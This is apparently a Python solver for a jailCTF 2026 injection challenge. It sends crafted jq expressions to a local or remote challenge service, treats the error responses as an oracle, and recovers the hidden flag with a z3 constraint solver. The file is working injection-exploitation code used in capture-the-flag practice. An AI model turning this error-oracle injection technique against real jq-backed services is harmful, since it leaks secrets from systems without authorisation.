#!/usr/bin/env python3
"""
Progress + jq-calibrated set-oracle solver for jailCTF 2026
"just another injection challenge".

Why this exists:
  - The original singleton solver assumes each predicate chain identifies one
    exact integer value.  The remote disagrees, so it can eliminate the prefix.
  - The first set fallback used Python's math module to approximate jq math.
    That can still disagree with jq.  This version calibrates accept-sets by
    asking the local jq binary directly, then queries the remote in visible
    progress batches so it does not look frozen.

Examples:
  python3 -u solve_set_oracle_v2.py --chains singletons.json local \
      --server server.py --flag 'jail{abc}' --jq jq

  python3 -u solve_set_oracle_v2.py --chains singletons.json remote \
      challs.pyjail.club 20219

  python3 -u solve_set_oracle_v2.py --chains singletons.json \
      --feature-count 124 remote challs.pyjail.club 20219
"""
from __future__ import annotations

import argparse
import importlib.util
import json
import subprocess
import sys
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Iterable


def load_base(path: Path | None):
    here = Path(__file__).resolve().parent
    candidates: list[Path] = []
    if path is not None:
        candidates.append(path)
    candidates += [here / "solve_checked.py", here / "solve.py"]
    for cand in candidates:
        if cand.exists():
            spec = importlib.util.spec_from_file_location("base_solve", str(cand))
            if spec is None or spec.loader is None:
                continue
            mod = importlib.util.module_from_spec(spec)
            sys.modules["base_solve"] = mod
            spec.loader.exec_module(mod)  # type: ignore[union-attr]
            print(f"[+] using base solver module: {cand}", flush=True)
            return mod
    raise SystemExit("[-] missing solve_checked.py or solve.py in this directory")


def predicate(ops: list[str]) -> str:
    # Same macro as the original solver.  Each math op is followed by jq's
    # normals filter so a chain accepts only values that survive every step.
    parts: list[str] = []
    for op in ops:
        parts.append(op)
        parts.append("normals")
    return "|".join(parts)


def unique_chains(chains_path: Path) -> list[list[str]]:
    raw = json.loads(chains_path.read_text())
    out: list[list[str]] = []
    seen: set[tuple[str, ...]] = set()
    for _, ops in sorted(raw.items(), key=lambda kv: int(kv[0])):
        t = tuple(ops)
        if t not in seen:
            seen.add(t)
            out.append(list(ops))
    return out


@dataclass(frozen=True)
class SetObservation:
    fi: int
    reverse: bool
    accept: frozenset[int]
    nuisance_in: bool
    present: bool


def build_value_universe(base, length: int, charset: str, feature_count: int) -> set[int]:
    domains = {i: base.fixed_domain(i, length, charset) for i in range(length)}
    allvals: set[int] = set()
    for fi in range(feature_count):
        feature = base.FEATURES[fi]
        for reverse in (False, True):
            allvals.add(feature.evaluate(length - 1, None))
            for pos, chars in domains.items():
                idx = length - 1 - pos if reverse else pos
                for c in chars:
                    allvals.add(feature.evaluate(idx, c))
    return allvals


def jq_version(jq_cmd: str) -> str:
    try:
        r = subprocess.run([jq_cmd, "--version"], text=True, stdout=subprocess.PIPE,
                           stderr=subprocess.PIPE, timeout=10, check=False)
        return (r.stdout or r.stderr).strip() or "unknown"
    except Exception as e:
        return f"unavailable: {e!r}"


def jq_accept_set(jq_cmd: str, values: list[int], ops: list[str]) -> set[int]:
    # One jq invocation per predicate chain.  For each candidate integer v, run
    # the exact predicate under jq; if it produces any output, emit v.
    pred = predicate(ops)
    values_json = json.dumps(values, separators=(",", ":"))
    expr = f"{values_json}[] as $v | try ($v|{pred}|$v) catch empty"
    r = subprocess.run(
        [jq_cmd, "-n", "-c", f"[{expr}]"],
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        timeout=30,
        check=False,
    )
    if r.returncode not in (0, 4):
        raise RuntimeError(
            f"jq calibration failed for {ops}: rc={r.returncode}, stderr={r.stderr[-500:]!r}"
        )
    text = r.stdout.strip() or "[]"
    try:
        return set(map(int, json.loads(text)))
    except Exception as e:
        raise RuntimeError(f"bad jq calibration output for {ops}: {text[:500]!r}") from e


def accept_sets_by_jq(jq_cmd: str, chains: list[list[str]], values: Iterable[int]) -> list[set[int]]:
    values_list = sorted(set(map(int, values)))
    print(f"[+] calibrating accept-sets with {jq_cmd!r} ({jq_version(jq_cmd)})", flush=True)
    print(f"[+] candidate numeric universe: {len(values_list)} values", flush=True)
    accepts: list[set[int]] = []
    started = time.time()
    for i, ops in enumerate(chains, 1):
        acc = jq_accept_set(jq_cmd, values_list, ops)
        accepts.append(acc)
        if i == 1 or i == len(chains) or i % 10 == 0:
            print(f"    calibrated {i}/{len(chains)} chains", flush=True)
    print(f"[+] calibration done in {time.time() - started:.2f}s", flush=True)
    empty = [i for i, acc in enumerate(accepts) if not acc]
    if empty:
        print(f"[!] warning: {len(empty)} chains accept no candidate values", flush=True)
    return accepts


def make_set_queries(base, length: int, charset: str, feature_count: int,
                     chains: list[list[str]], accepts: list[set[int]]):
    domains = {i: base.fixed_domain(i, length, charset) for i in range(length)}
    exprs: list[str] = []
    meta: list[tuple[int, bool, int]] = []
    for fi in range(feature_count):
        feature = base.FEATURES[fi]
        for reverse in (False, True):
            vals = {feature.evaluate(length - 1, None)}
            for pos, chars in domains.items():
                idx = length - 1 - pos if reverse else pos
                vals.update(feature.evaluate(idx, c) for c in chars)
            base_expr = base.BASE + ("|explode|reverse|implode" if reverse else "")
            for ci, ops in enumerate(chains):
                inter = vals & accepts[ci]
                if not inter or inter == vals:
                    continue
                exprs.append(
                    f"{base_expr}|explode|tostream|{feature.suffix}|{predicate(ops)}|error"
                )
                meta.append((fi, reverse, ci))
    return exprs, meta


def query_with_progress(oracle, expressions: list[str], batch: int) -> list[str]:
    out: list[str] = []
    total = len(expressions)
    started = time.time()
    if total == 0:
        return out
    for off in range(0, total, batch):
        group = expressions[off:off + batch]
        ans = oracle.query_batch(group)
        out.extend(ans)
        print(f"    progress: {len(out)}/{total} queries ({time.time() - started:.1f}s)", flush=True)
    return out


def domains_from_obs(base, length: int, charset: str, observations: list[SetObservation]):
    domains = {i: base.fixed_domain(i, length, charset) for i in range(length)}
    for obs in observations:
        if obs.present:
            continue
        feature = base.FEATURES[obs.fi]
        for pos in range(length):
            idx = length - 1 - pos if obs.reverse else pos
            domains[pos] = [
                c for c in domains[pos] if feature.evaluate(idx, c) not in obs.accept
            ]
            if not domains[pos]:
                raise RuntimeError(
                    f"empty domain at position {pos} from feature {obs.fi} "
                    f"{feature.name}; accept-set calibration still mismatches server"
                )
    return domains


def constraints_from_obs(base, length: int, observations: list[SetObservation], domains):
    constraints: set[frozenset[tuple[int, int]]] = set()
    for obs in observations:
        if not obs.present or obs.nuisance_in:
            continue
        feature = base.FEATURES[obs.fi]
        opts: set[tuple[int, int]] = set()
        for pos, chars in domains.items():
            idx = length - 1 - pos if obs.reverse else pos
            for c in chars:
                if feature.evaluate(idx, c) in obs.accept:
                    opts.add((pos, c))
        if opts:
            constraints.add(frozenset(opts))
    return sorted(constraints, key=lambda item: (len(item), sorted(item)))


def extend_raw_features(base):
    if any(getattr(f, "name", "").startswith("raw_impl_j") for f in base.FEATURES):
        return

    def nested_json(value, nesting: int):
        for _ in range(nesting):
            value = json.dumps(value, ensure_ascii=False, separators=(",", ":"))
        return value

    for nesting in range(0, 9):
        prefix = "flatten|implode|" + ("tojson|" * nesting)

        def encoded(i, c, nesting=nesting):
            vals = [i] if c is None else [i, c]
            value = "".join(chr(v) for v in vals)
            value = nested_json(value, nesting)
            return value

        def raw_add(i, c, encoded=encoded):
            return sum(map(ord, encoded(i, c)))

        def raw_unique(i, c, encoded=encoded):
            return sum(set(map(ord, encoded(i, c))))

        base.FEATURES.append(base.Feature(
            f"raw_impl_j{nesting}_add", prefix + "explode|add", raw_add
        ))
        base.FEATURES.append(base.Feature(
            f"raw_impl_j{nesting}_uniq", prefix + "explode|unique|add", raw_unique
        ))

    print(f"[+] extended feature library to {len(base.FEATURES)} features", flush=True)


def solve_constraints_z3(length: int, domains, constraints, limit: int = 2):
    try:
        import z3
    except ImportError as exc:
        raise RuntimeError("z3-solver is required for the large CSP") from exc

    xs = [z3.Int(f"c_{i}") for i in range(length)]
    solver = z3.Solver()
    for i, chars in domains.items():
        solver.add(z3.Or([xs[i] == c for c in chars]))
    for constraint in constraints:
        solver.add(z3.Or([xs[i] == c for i, c in constraint]))

    solutions = []
    while len(solutions) < limit and solver.check() == z3.sat:
        model = solver.model()
        vals = [model.eval(xs[i]).as_long() for i in range(length)]
        solutions.append("".join(map(chr, vals)))
        solver.add(z3.Or([xs[i] != vals[i] for i in range(length)]))
    return solutions


def make_oracle(base, args):
    if args.mode == "local":
        return base.LocalServerOracle(args.server, args.flag, args.jq, args.timeout)
    last = None
    for attempt in range(1, args.connect_retries + 1):
        try:
            return base.RemoteOracle(args.host, args.port, args.timeout)
        except Exception as e:
            last = e
            print(f"[!] remote connect attempt {attempt}/{args.connect_retries} failed: {type(e).__name__}: {e}", flush=True)
            time.sleep(min(2 * attempt, 8))
    raise last  # type: ignore[misc]


def solve_once(base, oracle, chains_path: Path, charset: str, minimum: int, maximum: int,
               feature_count: int, limit: int, jq_cmd: str, progress_batch: int,
               known_length: int | None = None):
    raw = json.loads(chains_path.read_text())
    singleton_chains = {int(value): ops for value, ops in raw.items()}
    print(f"[+] loaded {len(singleton_chains)} singleton labels for length recovery", flush=True)

    if known_length is not None:
        length = known_length
        print(f"[+] using verified flag length = {length}", flush=True)
    else:
        print("[*] recovering flag length", flush=True)
        length = base.recover_length(oracle, singleton_chains, minimum, maximum)
        print(f"[+] flag length = {length}", flush=True)

    chains = unique_chains(chains_path)
    print(f"[+] using {len(chains)} unique predicate chains as jq-calibrated accept-sets", flush=True)
    allvals = build_value_universe(base, length, charset, feature_count)
    accepts = accept_sets_by_jq(jq_cmd, chains, allvals)

    exprs, meta = make_set_queries(base, length, charset, feature_count, chains, accepts)
    print(f"[*] set broad phase: {feature_count} features, {len(exprs)} oracle queries", flush=True)
    answers = query_with_progress(oracle, exprs, progress_batch)

    observations: list[SetObservation] = []
    for (fi, reverse, ci), ans in zip(meta, answers):
        nuisance = base.FEATURES[fi].evaluate(length - 1, None)
        observations.append(
            SetObservation(
                fi=fi,
                reverse=reverse,
                accept=frozenset(accepts[ci]),
                nuisance_in=nuisance in accepts[ci],
                present=ans == "error",
            )
        )

    domains = domains_from_obs(base, length, charset, observations)
    constraints = constraints_from_obs(base, length, observations, domains)
    print(f"[+] domain size: {sum(map(len, domains.values()))}; positive constraints: {len(constraints)}", flush=True)
    for pos, chars in domains.items():
        if len(chars) > 1:
            print(f"[!] ambiguous domain at {pos}: {''.join(map(chr, chars))}", flush=True)

    solutions = solve_constraints_z3(length, domains, constraints, limit=limit)
    print(f"[+] solutions: {solutions}", flush=True)
    if len(solutions) != 1:
        raise RuntimeError(
            "not unique/inconsistent; rerun with --feature-count 124 --limit 20, or paste this output back"
        )
    return solutions[0]


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--base", type=Path, default=None, help="solve_checked.py or solve.py")
    parser.add_argument("--chains", type=Path, default=Path("singletons.json"))
    parser.add_argument("--charset", default=None)
    parser.add_argument("--min-length", type=int, default=6)
    parser.add_argument("--max-length", type=int, default=128)
    parser.add_argument("--known-length", type=int, default=None, help="skip broken singleton length recovery")
    parser.add_argument("--feature-count", type=int, default=84)
    parser.add_argument("--limit", type=int, default=5)
    parser.add_argument("--calibrate-jq", default="jq", help="local jq used to model predicate chains")
    parser.add_argument("--progress-batch", type=int, default=96)
    parser.add_argument("--connect-retries", type=int, default=5)
    sub = parser.add_subparsers(dest="mode", required=True)

    local = sub.add_parser("local")
    local.add_argument("--server", type=Path, default=Path("server.py"))
    local.add_argument("--flag", default="jail{abc}")
    local.add_argument("--jq", default="jq")
    local.add_argument("--timeout", type=int, default=600)

    remote = sub.add_parser("remote")
    remote.add_argument("host")
    remote.add_argument("port", type=int)
    remote.add_argument("--timeout", type=int, default=360)

    args = parser.parse_args()
    base = load_base(args.base)
    extend_raw_features(base)
    charset = args.charset or base.DEFAULT_CHARSET
    jq_cmd = args.jq if args.mode == "local" else args.calibrate_jq

    oracle = make_oracle(base, args)
    try:
        flag = solve_once(
            base, oracle, args.chains, charset, args.min_length, args.max_length,
            args.feature_count, args.limit, jq_cmd, args.progress_batch,
            args.known_length
        )
    finally:
        oracle.close()

    print(f"[+] recovered flag: {flag}", flush=True)
    if args.mode == "local" and flag != args.flag:
        print(f"[-] local verification failed: expected {args.flag!r}", file=sys.stderr, flush=True)
        return 1
    print("[+] verification successful", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
